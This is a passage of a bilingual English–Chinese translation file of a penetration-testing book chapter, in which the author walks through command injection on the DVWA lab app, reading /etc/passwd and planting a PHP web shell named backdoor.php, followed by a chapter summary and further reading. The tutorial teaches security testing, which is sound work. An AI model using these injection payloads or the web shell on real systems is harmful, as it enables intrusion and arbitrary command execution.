  type: TYPE_IMG
  zh: '![](img/92f93794-3eab-4af8-a70c-49476382b33b.jpg)'
- en: 'Now we''ve confirmed that the input is not validated before it is processed,
    as the lines after the ping statistics show us the files of the current directory.
    We can expand on this and get the current directory we''re in and what user is
    executing the commands. Enter `127.0.0.1`; `pwd`; `whoami`:'
  id: totrans-301
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经确认，在处理之前没有验证输入，因为ping统计后的行显示了当前目录的文件。我们可以扩展这一点，获取我们所在的当前目录以及执行命令的用户是谁。输入`127.0.0.1`；`pwd`；`whoami`：
- en: '![](img/969d3e82-1248-4e80-b20a-3e820bec1624.jpg)'
  id: totrans-302
  prefs: []
  type: TYPE_IMG
  zh: '![](img/969d3e82-1248-4e80-b20a-3e820bec1624.jpg)'
- en: 'From our results, we see that we''re currently in the `/owaspbwa/dvwa-git/vulnerabilities/exec`
    directory and we''re executing the commands as the `www-data` user. Now let''s
    try to print the contents of a file, specifically the `/etc/passwd` file. In the
    input field, enter `127.0.0.1` and `cat /etc/paswd`:'
  id: totrans-303
  prefs: []
  type: TYPE_NORMAL
  zh: 从我们的结果中，我们看到我们目前在`/owaspbwa/dvwa-git/vulnerabilities/exec`目录中，并且我们正在以`www-data`用户的身份执行命令。现在让我们尝试打印文件的内容，特别是`/etc/passwd`文件。在输入框中，输入`127.0.0.1`和`cat
    /etc/paswd`：
- en: '![](img/dd2b0c08-949f-46af-ab68-60bb8f2ac836.jpg)'
  id: totrans-304
  prefs: []
  type: TYPE_IMG
  zh: '![](img/dd2b0c08-949f-46af-ab68-60bb8f2ac836.jpg)'
- en: This snippet should look like the results from our earlier LFI.
  id: totrans-305
  prefs: []
  type: TYPE_NORMAL
  zh: 这个片段应该看起来像我们之前LFI的结果。
- en: Let's do one more thing. Let's create a file in the directory and we can always
    refer to this later to execute commands. Enter `127.0.0.1` and `echo “<?php system(\$_GET[‘cmd’])
    ?>” > backdoor.php`. This should create a PHP file with the name `backdoor` and
    the PHP code inside should be system (`\$_GET[‘cmd’]`).
  id: totrans-306
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们再做一件事。让我们在目录中创建一个文件，以便以后可以参考这个文件来执行命令。输入`127.0.0.1`和`echo “<?php system(\$_GET[‘cmd’])
    ?>” > backdoor.php`。这应该创建一个名为`backdoor`的PHP文件，里面的PHP代码应该是`system (\$_GET[‘cmd’])`。
- en: Now, in the browser, navigate to `<ip address>/dvwa/vulnerabilities/exec/backdoor.php`.
  id: totrans-307
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，在浏览器中导航到`<ip address>/dvwa/vulnerabilities/exec/backdoor.php`。
- en: 'The page loads, however, nothing is displayed. This is because we have not
    passed any commands yet. Looking at what we type, in single quotes we have `cmd`.
    This is our variable that stores the command we would like to execute and passes
    it to the system for execution. To execute a command, after `backdoor.php` in
    the address bar, enter `?cmd=` and then your command. I''ll use `ls` as a basic
    demo:'
  id: totrans-308
  prefs: []
  type: TYPE_NORMAL
  zh: 页面加载了，但是没有显示任何内容。这是因为我们还没有传递任何命令。看看我们输入的内容，在单引号中我们有`cmd`。这是我们的变量，用于存储我们想要执行的命令，并将其传递给系统执行。要执行一个命令，在地址栏中的`backdoor.php`后面，输入`?cmd=`，然后输入你的命令。我将使用`ls`作为一个基本演示：
- en: '![](img/eed2b93b-7672-43f3-86a4-03ef5d90ad26.jpg)'
  id: totrans-309
  prefs: []
  type: TYPE_IMG
  zh: '![](img/eed2b93b-7672-43f3-86a4-03ef5d90ad26.jpg)'
- en: 'Use your imagination from this point to try different possibilities. Admittedly,
    the presentation needs a bit of work, but you can always view the source code
    to clean it up:'
  id: totrans-310
  prefs: []
  type: TYPE_NORMAL
  zh: 从这一点开始，可以���挥你的想象力，尝试不同的可能性。诚然，演示需要一些工作，但你可以随时查看源代码进行清理：
- en: '![](img/aa4904c9-ae34-46bf-8804-5e1c3f77859a.jpg)'
  id: totrans-311
  prefs: []
  type: TYPE_IMG
  zh: '![](img/aa4904c9-ae34-46bf-8804-5e1c3f77859a.jpg)'
- en: I would add that you can use the Repeater in Burp Suite to do these steps and
    you can also use Burp Suite in conjunction with `sqlmap` and Metasploit to get
    a meterpreter shell.
  id: totrans-312
  prefs: []
  type: TYPE_NORMAL
  zh: 我想补充一点，你可以使用Burp Suite中的Repeater来执行这些步骤，你也可以将Burp Suite与`sqlmap`和Metasploit一起使用来获得一个meterpreter
    shell。
- en: Summary
  id: totrans-313
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 摘要
- en: In this chapter, we took a look at some of the major tools used for web application
    testing and, by extension, cloud applications, as they are built on the same protocols
    and use many of the same platforms.
  id: totrans-314
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们看了一些用于Web应用程序测试的主要工具，通过延伸，云应用程序也是如此，因为它们建立在相同的协议上并使用许多相同的平台。
- en: As you can tell, these vulnerabilities have a common root cause, that is, user
    input that is not sanitized or validated to ensure that the required data is being
    used for processing. Additionally, the exploitation of one vulnerability can allow
    for another to be exploited (directory traversal to file inclusion, as an example).
  id: totrans-315
  prefs: []
  type: TYPE_NORMAL
  zh: 正如你所看到的，这些漏洞有一个共同的根本原因，即用户输入没有经过净化或验证，以确保所需的数据被用于处理。此外，对一个漏洞的利用可以允许另一个漏洞被利用（例如目录遍历到文件包含）。
- en: We looked at OWASP ZAP, Nikto, `sqlmap`, and Burp Suite to identify possible
    vulnerabilities, test for them, and exploit them. However, Kali comes with many
    other tools that can be used to do these tests and many can be used together.
  id: totrans-316
  prefs: []
  type: TYPE_NORMAL
  zh: 我们使用OWASP ZAP、Nikto、`sqlmap`和Burp Suite来识别可能的漏洞，测试它们并利用它们。然而，Kali还配备了许多其他工具，可以用来进行这些测试，许多工具可以一起使用。
- en: Burp Suite and OWASP ZAP in particular are very powerful standalone tools that
    accomplish all that we've looked at and even some things we did not look at. We
    can even use them to do directory-traversal and file-inclusion tests.
  id: totrans-317
  prefs: []
  type: TYPE_NORMAL
  zh: Burp Suite和OWASP ZAP特别是非常强大的独立工具，可以完成我们所看到的一切，甚至一些我们没有看到的东西。我们甚至可以使用它们进行目录遍历和文件包含测试。
- en: 'Some other tools to look at are the following:'
  id: totrans-318
  prefs: []
  type: TYPE_NORMAL
  zh: 一些其他要看的工具如下：
- en: Commix (Command injection vulnerability tool)
  id: totrans-319
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Commix（命令注入漏洞工具）
- en: DirBuster (web server directory brute-force tool)
  id: totrans-320
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: DirBuster（Web服务器目录暴力破解工具）
- en: Recon-NG (web reconnaissance tool)
  id: totrans-321
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Recon-NG（网络侦察工具）
- en: Sqlninja (Microsoft SQL injection tool)
  id: totrans-322
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Sqlninja（Microsoft SQL注入工具）
- en: In the next chapter, we'll be taking a look at wireless network analysis, attacking
    the networks using various tools to gain access, and methods of maintaining access
    to the network. We'll even look at the initial steps in setting up an Evil Twin
    (Rogue AP).
  id: totrans-323
  prefs: []
  type: TYPE_NORMAL
  zh: 在下一章中，我们将看一下无线网络分析，使用各种工具攻击网络以获取访问权限，并保持对网络的访问的方法。我们甚至会看一下设置恶意双子（Rogue AP）的初始步骤。
- en: Further reading
  id: totrans-324
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 进一步阅读
- en: 'There are many resources available to understand more about web and cloud application
    testing. Here is a list of resources:'
  id: totrans-325
  prefs: []
  type: TYPE_NORMAL
  zh: 有许多资源可供了解更多关于Web和云应用程序测试的信息。以下是一些资源：
- en: '*Kali Linux Web Penetration Testing Cookbook – Second Edition* (Packt Publishing)'
  id: totrans-326
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '*Kali Linux Web渗透测试食谱-第二版*（Packt Publishing）'
- en: OWASP Top 10 2017 – The Ten Most Critical Web Application Security Risks: [https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf](https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf)
  id: totrans-327
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: OWASP十大2017年- 十大最关键的Web应用安全风险：[https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf](https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf)
- en: OWASP Foundation: [https://www.owasp.org/index.php/Main_Page](https://www.owasp.org/index.php/Main_Page)
  id: totrans-328
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: OWASP基金会：[https://www.owasp.org/index.php/Main_Page](https://www.owasp.org/index.php/Main_Page)
